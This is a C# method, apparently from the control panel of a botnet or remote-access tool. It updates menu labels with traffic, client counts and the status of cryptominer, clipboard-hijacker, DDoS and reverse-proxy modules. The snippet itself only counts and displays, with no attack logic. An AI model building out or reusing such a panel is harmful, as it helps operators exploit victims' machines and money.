	private void MbSecound_Tick(object sender, EventArgs e)
	{
		sents0mbsToolStripMenuItem.Text = "Sents [" + Methods.BytesToString(SocketData.Sent) + "/s]";
		recives0mbsToolStripMenuItem.Text = "Recives [" + Methods.BytesToString(SocketData.Recive) + "/s]";
		sents0mbToolStripMenuItem.Text = "Sents [" + Methods.BytesToString(SocketData.Sents) + "]";
		recives0mbToolStripMenuItem.Text = "Recives [" + Methods.BytesToString(SocketData.Recives) + "]";
		connects0ToolStripMenuItem.Text = $"Connects [{SocketData.Connects}]";
		SocketData.Clear();
		toolStripMenuItem11.Text = $"Online [{GridClients.Rows.Count}]";
		try
		{
			int totalUsers = (Directory.Exists("Users") ? Directory.GetDirectories("Users").Length : 0);
			int onlineUsers = GridClients.Rows.Count;
			int offlineUsers = Math.Max(0, totalUsers - onlineUsers);
			offline0ToolStripMenuItem.Text = $"Offline [{offlineUsers}]";
			toolStripMenuItem121.Text = $"Total [{totalUsers}]";
		}
		catch
		{
			offline0ToolStripMenuItem.Text = "Offline [0]";
			toolStripMenuItem121.Text = "Total [0]";
		}
		toolStripMenuItem12.Text = $"Selected [{GridClients.SelectedRows.Count}]";
		if (MinerXMR.work)
		{
			minersXmrigNotWorkToolStripMenuItem.Text = $"Miners xmrig [{MinerXMR.GridClients.Rows.Count}]";
		}
		else
		{
			minersXmrigNotWorkToolStripMenuItem.Text = "Miners xmrig [Not work]";
		}
		if (MinerRigel.work)
		{
			toolStripMenuItem122.Text = $"Miners rig [{MinerRigel.GridClients.Rows.Count}]";
		}
		else
		{
			toolStripMenuItem122.Text = "Miners rig [Not work]";
		}
		if (MinerEtc.work)
		{
			minersEtcNotWorkToolStripMenuItem.Text = $"Miners bz [{MinerEtc.GridClients.Rows.Count}]";
		}
		else
		{
			minersEtcNotWorkToolStripMenuItem.Text = "Miners bz [Not work]";
		}
		if (Clipper.work)
		{
			clippersNotWorkToolStripMenuItem.Text = $"Clippers [{Clipper.clients.Count}]";
		}
		else
		{
			clippersNotWorkToolStripMenuItem.Text = "Clippers [Not work]";
		}
		if (DDos.work)
		{
			dDosNotWorkToolStripMenuItem.Text = $"DDos [{DDos.clients.Count}]";
		}
		else
		{
			dDosNotWorkToolStripMenuItem.Text = "DDos [Not work]";
		}
		if (ReverseProxyR.work)
		{
			reverseProxyRNotWorkToolStripMenuItem.Text = $"Reverse Proxy R [{ReverseProxyR.Server.ClientReverse.Count}]";
		}
		else
		{
			reverseProxyRNotWorkToolStripMenuItem.Text = "Reverse Proxy R [Not work]";
		}
		if (ReverseProxyU.work)
		{
			reverseProxyUNotWorkToolStripMenuItem.Text = $"Reverse Proxy U [{ReverseProxyU.GridIps.Rows.Count}]";
		}
		else
		{
			reverseProxyUNotWorkToolStripMenuItem.Text = "Reverse Proxy U [Not work]";
		}
		GC.Collect();
	}

